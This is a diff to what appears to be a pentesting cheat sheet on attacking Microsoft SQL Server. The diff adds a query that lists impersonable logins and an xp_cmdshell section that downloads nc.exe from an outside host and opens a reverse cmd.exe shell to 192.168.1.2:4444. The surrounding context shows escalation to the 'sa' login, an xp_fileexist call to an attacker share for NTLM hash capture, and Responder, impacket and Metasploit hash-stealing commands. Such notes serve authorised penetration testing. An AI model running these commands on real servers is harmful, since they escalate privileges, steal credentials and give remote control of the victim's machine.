@@ -97,6 +97,14 @@ GO
 **Impersonating the SA User**
 
 ```cmd-session
+# Find users you can impersonate
+SELECT distinct b.name
+FROM sys.server_permissions a
+INNER JOIN sys.server_principals b
+ON a.grantor_principal_id = b.principal_id
+WHERE a.permission_name = 'IMPERSONATE'
+# Check if the user "sa" or any other high privileged user is mentioned
+
 1> EXECUTE AS LOGIN = 'sa'
 2> SELECT SYSTEM_USER
 3> SELECT IS_SRVROLEMEMBER('sysadmin')
@@ -127,4 +135,11 @@ EXEC master..xp_fileexist '\\<attacker_IP>\anything\'
 sudo responder -I tun0
 sudo impacket-smbserver share ./ -smb2support
 msf> use auxiliary/admin/mssql/mssql_ntlm_stealer
+```
+
+### XP\_CMDSHELL reverse shell
+
+```
+xp_cmdshell "powershell.exe wget http://192.168.1.2/nc.exe -OutFile c:\\Users\Public\\nc.exe"
+xp_cmdshell  "c:\\Users\Public\\nc.exe -e cmd.exe 192.168.1.2 4444"
 ```
